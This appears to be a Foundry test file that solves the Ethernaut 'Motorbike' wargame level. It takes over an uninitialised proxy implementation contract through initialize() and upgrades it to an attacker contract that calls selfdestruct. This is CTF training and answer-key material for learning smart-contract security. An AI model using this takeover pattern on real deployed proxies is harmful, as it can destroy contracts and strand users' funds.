// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Motorbike/Motorbike.sol";
import "../src/Motorbike/MotorbikeFactory.sol";
import "../src/Ethernaut.sol";

contract MotorbikeTest is Test {
    Ethernaut private _ethernaut;
    MotorbikeFactory private _motorbikeFactory;
    Motorbike private _motorbike;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_motorbikeFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_motorbikeFactory);
        _motorbike = Motorbike(payable(instance));
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_motorbike))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _motorbikeFactory = new MotorbikeFactory();
    }

    function testIsMotorbikeCleared() public testWrapper {
        address instance = address(_motorbike);
        bytes32 _IMPLEMENTATION_SLOT = vm.load(
            instance,
            bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
        );
        address engine_ = address(uint160(uint256(_IMPLEMENTATION_SLOT)));

        Engine engine = Engine(engine_);
        engine.initialize();

        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker();

        require(Address.isContract(engine_), "engine_ is not a contract");

        engine.upgradeToAndCall(
            address(motorbikeAttacker),
            abi.encodeWithSignature("breakEngine()")
        );

        engine.upgrader();

        require(!Address.isContract(engine_), "engine_ is still a contract");
    }
}

contract MotorbikeAttacker {
    function breakEngine() external {
        selfdestruct(payable(msg.sender));
    }
}
